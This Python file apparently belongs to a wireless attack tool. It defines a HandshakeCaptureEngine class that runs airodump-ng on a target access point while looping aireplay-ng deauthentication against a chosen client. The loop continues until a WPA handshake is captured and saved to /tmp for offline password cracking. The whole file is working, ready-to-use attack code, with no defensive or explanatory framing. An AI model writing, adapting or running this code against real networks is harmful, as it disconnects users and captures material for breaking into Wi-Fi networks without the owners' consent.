import subprocess
import threading
import time
import re
import pty
import os
import select

class HandshakeCaptureEngine:
    def __init__(self, interface, bssid, channel, essid, client_mac, on_log, on_success):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)
        self.essid = essid
        self.client_mac = client_mac
        self.on_log = on_log
        self.on_success = on_success
        self.airodump_proc = None
        self.stop_event = threading.Event()
        self.captured = False

    def start(self):
        self.stop_event.clear()
        self.on_log(f"[*] Starting handshake capture on {self.essid}...")
        self.dump_thread = threading.Thread(target=self._airodump_loop, daemon=True)
        self.deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self.dump_thread.start()
        self.deauth_thread.start()

    def stop(self):
        self.stop_event.set()
        if self.airodump_proc:
            self.airodump_proc.terminate()
            self.airodump_proc.wait()
        self.on_log("[!] Handshake capture stopped.")

    def _airodump_loop(self):
        for f in os.listdir("/tmp"):
            if f.startswith("vekt_hs"):
                os.remove(os.path.join("/tmp", f))

        master, slave = pty.openpty()
        cmd = ["airodump-ng", "--bssid", self.bssid, "-c", self.channel, "-w", "/tmp/vekt_hs", self.interface]
        self.airodump_proc = subprocess.Popen(cmd, stdout=slave, stderr=slave, text=True)
        os.close(slave)
        
        while not self.stop_event.is_set() and not self.captured:
            rlist, _, _ = select.select([master], [], [], 1.0)
            if rlist:
                try:
                    data = os.read(master, 4096).decode('utf-8', errors='ignore')
                    if not data: continue
                    if "WPA handshake" in data:
                        self.captured = True
                        self.on_success("handshake", "/tmp/vekt_hs-01.cap")
                        self.on_log(f"[+] WPA Handshake Captured! Saved to /tmp/vekt_hs-01.cap")
                        break
                except OSError:
                    break
        
        if self.airodump_proc and self.airodump_proc.poll() is None:
            self.airodump_proc.terminate()
            self.airodump_proc.wait()

    def _deauth_loop(self):
        while not self.stop_event.is_set() and not self.captured:
            self.on_log(f"[*] Sending Deauth to {self.client_mac} for 10 seconds...")
            cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid, "-c", self.client_mac, self.interface]
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                if self.stop_event.wait(10): 
                    proc.terminate()
                    proc.wait()
                    break
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait()
            except Exception as e:
                self.on_log(f"[-] Deauth error: {e}")
            
            if not self.captured and not self.stop_event.is_set():
                self.on_log("[*] Pausing deauth for 5 seconds to check for handshake...")
                self.stop_event.wait(5)